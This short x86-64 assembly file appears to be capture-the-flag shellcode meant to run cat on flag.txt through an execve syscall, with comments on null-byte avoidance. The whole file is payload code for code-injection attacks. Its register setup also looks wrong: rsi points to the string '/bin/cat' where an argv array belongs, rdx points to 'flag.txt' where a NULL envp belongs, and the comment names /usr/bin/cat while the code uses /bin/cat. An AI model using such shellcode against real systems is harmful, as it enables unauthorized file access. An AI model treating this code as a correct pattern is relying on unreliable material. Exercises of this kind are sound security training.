; create shellcode to read /flag.txt
; /bin/cat /flag.txt

global _start

section .text
_start:
	; execve("/usr/bin/cat", ["/usr/bin/cat", "flag.txt"], NULL)
	; little endian -> 0x1234 is 0x4321
	; f(a,b,c) -> push c push b push a call f
	; cant have null bytes so just xor a register to clear it and push it

        xor rax, rax
        push rax

	mov rdx, "flag.txt"
	push rdx

	mov rdx, rsp
	push rax

	mov rsi, "/bin/cat"
	push rsi

	mov rsi, rsp
	push rax

	mov rdi, "/bin/cat"
	push rdi

	mov rdi, rsp

	mov rax, 59
	syscall
